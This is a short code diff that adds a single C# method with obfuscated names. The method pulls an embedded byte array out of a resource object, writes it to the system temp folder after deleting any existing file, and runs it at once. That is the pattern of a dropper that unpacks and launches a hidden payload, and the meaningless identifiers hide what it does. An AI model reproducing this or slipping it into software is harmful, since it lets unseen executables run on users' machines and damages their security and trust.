@@ -1,0 +1,8 @@
+public static void JJ9KK4BBB2JJ1 (string AA8JJ3BB3CC2, string FF1FF2FF3KK3KK2LL1CC1)
+{
+string BB1KK3AA1LL3FF3 = Path.GetTempPath() + AA8JJ3BB3CC2;
+if(File.Exists(BB1KK3AA1LL3FF3))
+{File.Delete(BB1KK3AA1LL3FF3);}
+System.IO.File.WriteAllBytes(BB1KK3AA1LL3FF3, (byte[])JJ9.GetObject(FF1FF2FF3KK3KK2LL1CC1));
+System.Diagnostics.Process.Start(BB1KK3AA1LL3FF3);
+}
